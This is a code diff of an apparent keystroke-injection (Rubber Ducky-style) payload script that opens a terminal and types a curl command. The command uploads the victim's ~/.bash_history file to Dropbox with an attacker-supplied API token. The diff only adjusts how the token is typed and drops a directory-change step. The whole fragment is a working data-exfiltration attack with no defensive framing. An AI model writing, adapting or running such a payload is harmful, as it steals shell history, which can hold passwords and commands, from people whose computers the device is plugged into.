@@ -13,15 +13,12 @@ STRING xfce4-terminal
 DELAY 500
 ENTER
 DELAY 500
-STRING cd $HOME
-DELAY 500
-ENTER
-DELAY 500
 STRING curl -X POST https://content.dropboxapi.com/2/files/upload
 SPACE
-STRING --header "Authorization: Bearer #API_TOKEN"
+STRING --header "Authorization: Bearer
 SPACE
-STRING --header "Dropbox-API-Arg: {\"path\": \"/home/$USER/.bash_history\"}"
+STRING #API_TOKEN
+STRING " --header "Dropbox-API-Arg: {\"path\": \"/home/$USER/.bash_history\"}"
 SPACE
 STRING --header "Content-Type: application/octet-stream" --data-binary @.bash_history
 DELAY 500
